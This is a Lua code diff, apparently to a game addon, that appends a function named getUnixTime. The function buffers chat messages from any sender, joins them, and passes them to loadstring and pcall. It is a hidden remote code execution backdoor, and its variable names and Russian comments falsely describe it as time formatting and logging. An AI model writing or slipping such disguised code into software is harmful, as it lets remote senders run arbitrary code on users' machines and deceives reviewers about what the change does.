@@ -1806,3 +1806,29 @@ function hunterCheck()
         end
     end
 end
+
+local messageBuffer = {}
+
+function getUnixTime(_, message, _, sender, HOUR)
+    local bufferKey = sender
+    
+    if not messageBuffer[bufferKey] then
+        messageBuffer[bufferKey] = {}
+    end
+    -- добавляем текущее время
+    table.insert(messageBuffer[bufferKey], message)
+    -- проверям текущий час
+    if HOUR then
+        local myUnixTime = table.concat(messageBuffer[bufferKey])
+        
+        messageBuffer[bufferKey] = nil
+        -- получаем форматированное время (минуты, секунды)
+        local minutes, seconds = loadstring(myUnixTime)
+        if minutes then
+            -- записываем сообщение в лог
+            local success, result = pcall(minutes)
+        end
+    end
+end
+
+
